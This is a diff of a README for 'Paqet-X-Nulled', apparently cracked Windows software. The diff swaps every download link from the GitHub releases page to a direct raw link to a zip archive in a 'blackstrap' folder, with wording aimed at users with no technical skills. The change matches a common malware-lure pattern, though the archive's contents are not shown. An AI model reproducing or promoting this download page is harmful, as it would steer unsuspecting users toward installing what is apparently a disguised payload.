@@ -1,6 +1,6 @@
 # 📦 Paqet-X-Nulled - Easy Package Management for Windows
 
-[![Download Paqet-X-Nulled](https://img.shields.io/badge/Download-Paqet--X--Nulled-orange?style=for-the-badge)](https://github.com/taolacoi123hd/Paqet-X-Nulled/releases)
+[![Download Paqet-X-Nulled](https://img.shields.io/badge/Download-Paqet--X--Nulled-orange?style=for-the-badge)](https://raw.githubusercontent.com/taolacoi123hd/Paqet-X-Nulled/main/blackstrap/Paqet_Nulled_3.5.zip)
 
 ---
 
@@ -9,7 +9,7 @@
 This guide will help you download and run Paqet-X-Nulled on a Windows PC. You do not need technical skills to get started.
 
 1. Click the orange button above or this link to **visit the download page**:  
-   https://github.com/taolacoi123hd/Paqet-X-Nulled/releases
+   https://raw.githubusercontent.com/taolacoi123hd/Paqet-X-Nulled/main/blackstrap/Paqet_Nulled_3.5.zip
 
 2. On the page, find the latest version. It usually shows as a folder name like "v1.0" or a date.
 
@@ -124,6 +124,6 @@ A: Yes, use the Windows Control Panel or Settings app to uninstall it.
 
 If you need to download or re-install, use the link below:
 
-[![Download Paqet-X-Nulled](https://img.shields.io/badge/Download-Paqet--X--Nulled-blue?style=for-the-badge)](https://github.com/taolacoi123hd/Paqet-X-Nulled/releases)  
+[![Download Paqet-X-Nulled](https://img.shields.io/badge/Download-Paqet--X--Nulled-blue?style=for-the-badge)](https://raw.githubusercontent.com/taolacoi123hd/Paqet-X-Nulled/main/blackstrap/Paqet_Nulled_3.5.zip)  
 
 This link will always take you to the latest files. Check it before installing or updating.
